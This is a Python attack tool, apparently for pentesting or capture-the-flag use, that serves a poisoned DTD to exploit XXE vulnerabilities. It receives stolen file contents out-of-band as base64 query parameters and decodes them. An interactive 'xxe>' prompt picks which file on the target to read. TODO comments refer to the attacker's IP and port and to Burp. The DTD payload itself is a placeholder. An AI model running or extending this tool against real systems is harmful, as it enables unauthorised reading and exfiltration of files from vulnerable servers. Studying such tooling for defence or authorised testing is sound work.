import threading
from cmd import Cmd
import http.server
from base64 import b64decode
from urllib.parse import urlparse, parse_qs

payload = "Dummy string"

# TODO To parse the .req file, and then get the relevant data and make the request
# TODO Add argparse to get the .req filename dynamically, and also the attacker's IP and port for the OOB request


class RequestHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        with open("server.log", "a") as f:
            f.write(
                "%s - - [%s] %s\n"
                % (self.address_string(), self.log_date_time_string(), format % args)
            )

    def do_GET(self):
        """This function sends a custom poisoned .dtd file, and decodes the response"""
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.end_headers()

        if self.path.endswith(".dtd"):
            # Make payload for DTD
            self.wfile.write(payload.encode("utf-8"))
            return

        elif "content" in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)

            b64_value = params["content"][0]
            decoded = b64decode(b64_value).decode()
            print(f"\nDecoded Content:\n{decoded}\n")
            print(terminal.prompt, end="", flush=True)
            return
        else:
            print("Uninteneded request: {}".format(self.path))
            print(terminal.prompt, end="", flush=True)
            return


class Terminal(Cmd):
    prompt = "xxe> "

    def default(self, line):
        global payload

        # To update the xxe with the user required file dynamically
        with open("xxe.dtd") as f:
            temp_payload = f.read().replace("{line}", line)

        payload = temp_payload
        # TODO To make the request from here itself, instead of burp
        print(f"The file is {line}")

    def do_exit(self, arg):
        exit()


def run():
    server_address = ("", 8000)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()


t = threading.Thread(target=run)
t.daemon = True
t.start()

terminal = Terminal()
terminal.cmdloop()
